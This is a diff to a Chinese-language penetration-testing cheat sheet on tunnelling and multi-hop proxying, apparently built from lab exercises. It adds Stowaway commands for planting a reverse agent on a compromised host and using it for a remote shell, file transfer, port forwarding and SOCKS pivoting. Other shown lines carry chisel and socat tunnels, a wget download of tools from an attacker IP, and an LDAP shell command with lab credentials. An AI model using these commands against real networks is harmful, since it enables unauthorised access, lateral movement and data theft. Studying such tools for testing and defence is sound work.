@@ -10,7 +10,7 @@ https://gitee.com/windyjxx/projects
 
 [云资产 | LC 多云攻击面资产梳理开源工具](https://mp.weixin.qq.com/s/fmMVkNUkWGgXlHuVdbkGgA)
 
-[JS敏感泄露小帮手----WIH](https://mp.weixin.qq.com/s/AF2n260g0Q3GyRFNycrm4Q)
+[JS 敏感泄露小帮手----WIH](https://mp.weixin.qq.com/s/AF2n260g0Q3GyRFNycrm4Q)
 
 ### fscan
 
@@ -470,7 +470,7 @@ Ladon url.txt pythonpoc.ini
 
 proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15
 
-## frp
+## frp/多级代理/端口转发
 
 [神兵利器 | Frp 搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
 [隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)
@@ -532,6 +532,56 @@ token = frp123
 .\frpc tcp  -s "127.0.0.1:7000" -t frp123 -i "127.0.0.1" -l "2125"
 ```
 
+## stowaway/多级代理/端口转发
+
+```sh
+# 攻击机
+admin.exe -l 8899 -s 123
+# 被控机
+agent -c 192.168.52.1:8899 -s 123 --cs gbk # 类似reverse_tcp
+agent -l 10000 -s 123 # 主机 connect 过去，类似 bind
+
+admin> help
+admin> detail
+admin> use 1 # use 2, 选择节点
+
+(node 0) >> help
+(node 0) >> shell
+cmd >> chcp 65001
+(node 0) >> upload C:\test.txt
+(node 0) >> download C:\test.txt
+(node 0) >> addmemo test  # 添加备忘录
+(node 0) >> delmemo
+# 端口转发, 将 node 0 端口转到 攻击机 888
+(node 0) >> forward 888 127.0.0.1:3389
+# 建立代理, 攻击机:2222
+(node 0) >> socks 2222
+# ssh
+(node 0) >> ssh 127.0.0.1:22
+# backward: 反向映射当前agent上的端口至admin的本地端口
+(node 0) >> backward 9001 22
+
+# 多级代理
+## 方式1 bind
+agent1$ agent -c 192.168.3.5:888 -s 123
+agent2$ agent -l 10000 -s 123
+回到 admin端 ( node 0) >> connect 192.168.10.2:10000
+
+## 方式2 reverse
+agent1$ agent -c 192.168.3.5:888 -s 123
+admin端: use 0 -> listen -> 选择1.Normal Passive -> 输入10001 从而使得agent-1监听在10001端口上，并等待子节点的连接
+agent2$ agent -c 192.168.1.44:10001 -s 123
+
+# sshtunnel 没用过。再议
+```
+多级代理
+
+[drawlink](https://pixso.cn/app/editor/LasOE-_SNRRsiADn76wGvA)
+
+![alt text](../../public/imgs/rw_proxy_stowaway1.png)
+
+![alt text](../../public/imgs/rw_proxy_stowaway2.png)
+
 ## chisel
 
 ```sh
@@ -540,7 +590,7 @@ wget http://10.10.16.5/chisel_1.9.1_linux
 ./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
 ./chisel_1.9.1_linux_amd64 client 10.10.14.39:8001 R:socks
 ./socat tcp-listen:55555,reuseaddr,fork tcp:192.168.122.228:5985
-socat tcp-listen:5985,reuseaddr,fork tcp:10.10.16.5:55555
+./socat tcp-listen:5985,reuseaddr,fork tcp:10.10.16.5:55555
 ```
 
 ## goproxy
@@ -922,7 +972,7 @@ echo threathunterleaving | socat ‐ tcp:192.168.245.135:8000
 
 ## 其他隧道
 
-ICMP 隧道 [icmp隧道](https://mp.weixin.qq.com/s/Iuk7vENAOq6PPDHAzJNJxA)
+ICMP 隧道 [icmp 隧道](https://mp.weixin.qq.com/s/Iuk7vENAOq6PPDHAzJNJxA)
 
 - icmpsh
 - pingtunnnel
